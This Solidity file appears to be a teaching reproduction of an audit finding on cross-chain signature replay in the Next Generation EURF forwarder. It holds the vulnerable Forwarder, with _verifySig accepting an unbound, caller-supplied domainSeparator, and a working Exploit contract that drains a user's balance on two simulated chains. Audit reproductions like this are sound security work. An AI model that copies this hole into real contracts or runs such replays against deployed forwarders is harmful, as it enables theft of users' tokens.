// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Next Generation — Cross-chain signature replay via user-supplied
    domainSeparator (Code4rena 2025-01-next-generation, finding #56703, H-01)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: Forwarder._verifySig accepts domainSeparator as a caller-
    supplied argument and never binds it to block.chainid. A signature under
    domain A is accepted on every chain deployment, enabling cross-chain
    replay at matching nonces and unauthorized EURF transfers.

    Vulnerable _verifySig body preserved (@> VULN).
    ECDSA signatures are supplied via setDualSig (playground setup / forge vm.sign).
//////////////////////////////////////////////////////////////////////////*/

contract EURF {
    mapping(address => uint256) public balanceOf;
    address public trustedForwarder;

    function setTrustedForwarder(address f) external {
        trustedForwarder = f;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        address from = msg.sender;
        if (msg.sender == trustedForwarder && msg.data.length >= 24) {
            assembly {
                from := shr(96, calldataload(sub(calldatasize(), 20)))
            }
        }
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function payGaslessBasefee(address, address) external {}
}

/// @notice Reduced Forwarder — execute + user-supplied domainSeparator.
/// Source: contracts/Forwarder.sol @ 499cfa50.
contract Forwarder {
    struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
    }

    mapping(bytes32 => bool) public typeHashes;
    mapping(address => uint256) public nonces;

    EURF internal _eurf;
    address internal _eurfAddress;

    constructor(address eurf_) {
        _eurf = EURF(eurf_);
        _eurfAddress = eurf_;
        typeHashes[keccak256("ForwardRequest")] = true;
    }

    function execute(
        ForwardRequest calldata req,
        bytes32 domainSeparator,
        bytes32 requestTypeHash,
        bytes calldata suffixData,
        bytes calldata sig
    ) external payable returns (bool success, bytes memory ret) {
        _verifyNonce(req);
        _verifySig(req, domainSeparator, requestTypeHash, suffixData, sig);
        _updateNonce(req);

        require(req.to == _eurfAddress, "NGEUR Forwarder: can only forward NGEUR transactions");

        bytes4 transferSelector = bytes4(keccak256("transfer(address,uint256)"));
        bytes4 reqTransferSelector = bytes4(req.data[:4]);
        require(reqTransferSelector == transferSelector, "NGEUR Forwarder: can only forward transfer transactions");

        (success, ret) = req.to.call{gas: req.gas, value: req.value}(abi.encodePacked(req.data, req.from));
        require(success, "NGEUR Forwarder: failed tx execution");

        _eurf.payGaslessBasefee(req.from, msg.sender);
        return (success, ret);
    }

    function _verifyNonce(ForwardRequest memory req) internal view {
        require(nonces[req.from] == req.nonce, "NGEUR Forwarder: nonce mismatch");
    }

    function _updateNonce(ForwardRequest memory req) internal {
        nonces[req.from]++;
    }

    function _verifySig(
        ForwardRequest memory req,
        bytes32 domainSeparator,
        bytes32 requestTypeHash,
        bytes memory suffixData,
        bytes memory sig
    ) internal view {
        require(typeHashes[requestTypeHash], "NGEUR Forwarder: invalid request typehash");
        // FIX: compute domainSeparator on-chain with chainid + verifyingContract; enforce deadline
        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, keccak256(_getEncoded(req, requestTypeHash, suffixData))) // @> VULN: domainSeparator is user-supplied — not bound to block.chainid
        );
        require(_recover(digest, sig) == req.from, "NGEUR Forwarder: signature mismatch");
    }

    function _getEncoded(
        ForwardRequest memory req,
        bytes32 requestTypeHash,
        bytes memory suffixData
    ) public pure returns (bytes memory) {
        return abi.encodePacked(
            requestTypeHash,
            abi.encode(req.from, req.to, req.value, req.gas, req.nonce, keccak256(req.data)),
            suffixData
        );
    }

    function _recover(bytes32 digest, bytes memory sig) internal pure returns (address) {
        require(sig.length == 65, "sig len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        return ecrecover(digest, v, r, s);
    }
}

/// CREATE: eurfA(1), fwdA(2), eurfB(3), fwdB(4)
/// Two independent deployments model two chains (CREATE2 same-address intent).
contract Exploit {
    EURF public eurfA;
    Forwarder public fwdA;
    EURF public eurfB;
    Forwarder public fwdB;

    // anvil account0 / known key 0xac09…ff80
    address public constant USER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address public constant ATTACKER = address(0xB0B);
    uint256 public constant AMOUNT = 1000 ether;

    bytes32 public constant TYPEHASH = keccak256("ForwardRequest");
    // Domain the user used on "chain A" — accepted on chain B because not bound on-chain
    bytes32 public constant DOMAIN_A = keccak256("NGEUR-chain-A-domain");

    bytes public sigA;
    bytes public sigB;

    constructor() {
        eurfA = new EURF();
        fwdA = new Forwarder(address(eurfA));
        eurfA.setTrustedForwarder(address(fwdA));

        eurfB = new EURF();
        fwdB = new Forwarder(address(eurfB));
        eurfB.setTrustedForwarder(address(fwdB));

        eurfA.mint(USER, AMOUNT);
        eurfB.mint(USER, AMOUNT);
    }

    function setDualSig(bytes calldata a, bytes calldata b) external {
        sigA = a;
        sigB = b;
    }

    function buildTransferData() public pure returns (bytes memory) {
        return abi.encodeWithSignature("transfer(address,uint256)", ATTACKER, AMOUNT);
    }

    function digestFor(address eurf, uint256 nonce) public pure returns (bytes32) {
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", ATTACKER, AMOUNT);
        bytes32 structHash = keccak256(
            abi.encodePacked(
                TYPEHASH,
                abi.encode(USER, eurf, uint256(0), uint256(500_000), nonce, keccak256(data)),
                "" // empty suffixData
            )
        );
        return keccak256(abi.encodePacked("\x19\x01", DOMAIN_A, structHash));
    }

    function run() external {
        require(sigA.length == 65 && sigB.length == 65, "sigs not set");
        bytes memory data = buildTransferData();

        // Honest meta-tx on chain A under DOMAIN_A
        Forwarder.ForwardRequest memory reqA = Forwarder.ForwardRequest({
            from: USER,
            to: address(eurfA),
            value: 0,
            gas: 500_000,
            nonce: 0,
            data: data
        });
        fwdA.execute(reqA, DOMAIN_A, TYPEHASH, "", sigA);
        require(eurfA.balanceOf(ATTACKER) == AMOUNT, "A transfer");

        // Cross-chain: same DOMAIN_A accepted on chain B (no chainid binding)
        Forwarder.ForwardRequest memory reqB = Forwarder.ForwardRequest({
            from: USER,
            to: address(eurfB),
            value: 0,
            gas: 500_000,
            nonce: 0,
            data: data
        });
        fwdB.execute(reqB, DOMAIN_A, TYPEHASH, "", sigB);

        // HARM: attacker received AMOUNT on both chains; domain A worked cross-chain
        require(eurfB.balanceOf(ATTACKER) == AMOUNT, "harm: B not drained");
        require(eurfB.balanceOf(USER) == 0, "harm: user still funded on B");
        require(fwdA.nonces(USER) == 1 && fwdB.nonces(USER) == 1, "nonces");
    }
}
